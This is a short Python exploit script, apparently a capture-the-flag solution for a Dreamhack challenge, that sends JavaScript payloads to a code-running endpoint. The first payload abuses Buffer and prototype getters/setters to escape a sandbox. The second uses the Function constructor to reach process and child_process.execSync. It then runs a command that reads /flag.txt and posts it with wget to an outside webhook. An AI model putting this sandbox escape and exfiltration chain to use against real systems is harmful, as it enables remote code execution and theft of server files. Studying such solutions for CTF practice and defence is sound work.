import requests

url = 'http://host3.dreamhack.games:13508/'
s = requests.Session()

a = '''
b = Buffer.call;
f = a => b.call(b,{}[`__lookup${a}etter__`],Buffer,"__proto__");

WebAssembly.compileStreaming().catch(e=>b.call(b,f('S'),b.call(b,f('G'),e),null))
'''.strip().replace(' ', '')

b = '''
WebAssembly.compileStreaming().catch(e => {
    e.constructor.constructor("return process")().mainModule.require('child_process').execSync('%s')
})
'''.strip()

def rce(payload):
    res = s.post(f'{url}/run', json={
        'code': payload
    })

    assert res.json()['ok']
    print("> Executed payload")

rce(a)

webhook = 'https://aizdyqa.request.dreamhack.games'

cmd = 'cat /flag.txt | wget --post-data="$(cat)" %s' % webhook

rce(b % cmd)